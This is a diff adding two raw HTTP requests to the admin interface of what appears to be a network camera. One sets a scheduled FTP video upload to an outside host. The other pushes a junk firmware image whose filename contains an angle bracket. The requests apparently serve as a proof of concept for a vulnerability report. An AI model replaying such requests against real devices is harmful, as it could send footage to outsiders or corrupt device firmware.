@@ -1,0 +1,52 @@
+POST /setSystemFTP HTTP/1.1
+Host: 2.65.87.200
+Content-Length: 503
+Cache-Control: max-age=0
+Authorization: Digest username="admin", realm="_00", nonce="4981be60ff28fe3ccb29ee0a784e037d", uri="/setSystemFTP", response="6763da8635d776574c3c0c019ebb4347", qop=auth, nc=00000097, cnonce="b71947d7f56681f3"
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+Origin: http://2.65.87.200
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2.65.87.200/upload.htm
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+ReplySuccessPage=upload.htm&ReplyErrorPage=upload.htm&FTPScheduleEnable=1&FTPScheduleDay=5&FTPCreateFolderInterval=0&FTPHostAddress=2.4.6.8&FTPPortNumber=21&FTPUserName=dfvasfce&FTPPassword=qwertyuiopoiuyg&FTPDirectoryPath=%2F&FTPPassiveMode=1&FTPScheduleMode=1&FTPScheduleTimeStart=12%3A05%3A14&FTPScheduleTimeStop=23%3A05%3A03&FTPScheduleVideoFrequencyMode=0&FTPScheduleFramePerSecond=3&FTPScheduleFramePerSecondSel=3&FTPScheduleBaseFileName=videofilewjkjdk&FTPScheduleFileMode=0&ConfigSystemFTP=ApplyPOST /setFirmwareUpgrade HTTP/1.1
+Host: 2.65.87.200
+Content-Length: 4
+Cache-Control: max-age=0
+Authorization: Digest username="admin", realm="_00", nonce="4981be60ff28fe3ccb29ee0a784e037d", uri="/setFirmwareUpgrade", response="4d928f18b81afd3c92ecd6cf8081e1f0", qop=auth, nc=00000149, cnonce="8375412dcf710f1f"
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+Origin: http://2.65.87.200
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynzBw878OXEP03lmK
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2.65.87.200/upgrade.htm
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundarynzBw878OXEP03lmK
+Content-Disposition: form-data; name="ReplySuccessPage"
+
+replyu.htm
+------WebKitFormBoundarynzBw878OXEP03lmK
+Content-Disposition: form-data; name="ReplyErrorPage"
+
+replyk.htm
+------WebKitFormBoundarynzBw878OXEP03lmK
+Content-Disposition: form-data; name="ForceBootCodeUpgrade"
+
+0
+------WebKitFormBoundarynzBw878OXEP03lmK
+Content-Disposition: form-data; name="DownloadFile"; filename="d<fWFE.img"
+Content-Type: application/vnd.efi.img
+
+dfQRFWEFQFQGVERGETHWR
+------WebKitFormBoundarynzBw878OXEP03lmK
+Content-Disposition: form-data; name="DownloadCSRV"
+
+Upgrade
+------WebKitFormBoundarynzBw878OXEP03lmK--
